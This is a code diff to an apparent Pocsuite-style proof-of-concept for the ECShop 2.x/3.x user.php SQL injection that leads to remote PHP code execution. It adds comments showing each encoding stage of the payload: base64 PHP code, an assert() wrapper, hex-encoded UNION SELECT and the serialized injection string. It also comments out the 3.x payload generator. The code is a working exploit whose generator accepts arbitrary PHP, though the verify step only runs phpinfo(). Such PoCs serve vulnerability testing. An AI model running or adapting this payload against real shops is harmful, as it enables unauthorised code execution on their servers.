@@ -49,33 +49,41 @@ class DemoPOC(POCBase):
 
     def gen_ec2payload(self, phpcode):
         # ECShop 2.x payload
+        # b'cGhwaW5mbygp'
         encoded_code = base64.b64encode(phpcode.encode())
-
+        # {$asd'];assert(base64_decode('cGhwaW5mbygp'));//}xxx
         payload = """{$asd'];assert(base64_decode('%s'));//}xxx""" % (
             encoded_code.decode())
+        # 7b24617364275d3b617373657274286261736536345f6465636f64652827634768776157356d627967702729293b2f2f7d787878
         payload = binascii.hexlify(payload.encode()).decode()
+        # */SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f64652827634768776157356d627967702729293b2f2f7d787878,10-- -
         payload = '*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x{},10-- -'.format(payload)
+        """
+        554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:161:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f64652827634768776157356d627967702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
+        """
         payload = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:%s:"%s";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca''' % (
             len(payload), payload)
         return payload
 
-    def gen_ec3payload(self, phpcode):
-        # ECShop 3.x payload
-        encoded_code = base64.b64encode(phpcode.encode())
-
-        payload = "{$asd'];assert(base64_decode('%s'));//}xxx" % (
-            encoded_code.decode())
-
-        payload = binascii.hexlify(payload.encode()).decode()
-        payload = '*/ select 1,0x2720756e696f6e202f2a,3,4,5,6,7,8,0x{},10-- -'.format(payload)
-        payload = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{{s:3:"num";s:{}:"{}";s:2:"id";s:10:"\' union /*";}}'.format(
-            len(payload), payload)
-        return payload
+    # def gen_ec3payload(self, phpcode):
+    #     # ECShop 3.x payload
+    #     encoded_code = base64.b64encode(phpcode.encode())
+    #
+    #     payload = "{$asd'];assert(base64_decode('%s'));//}xxx" % (
+    #         encoded_code.decode())
+    #
+    #     payload = binascii.hexlify(payload.encode()).decode()
+    #     payload = '*/ select 1,0x2720756e696f6e202f2a,3,4,5,6,7,8,0x{},10-- -'.format(payload)
+    #     payload = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{{s:3:"num";s:{}:"{}";s:2:"id";s:10:"\' union /*";}}'.format(
+    #         len(payload), payload)
+    #     return payload
 
     def _verify(self):
         result = {}
         url = urljoin(self.url, '/user.php?act=login')
+        # 目标执行phpinfo
         phpcode = "phpinfo()"
+        # 判断页面中的关键字
         flagText = "allow_url_include"
 
         # ECShop 2.x payload
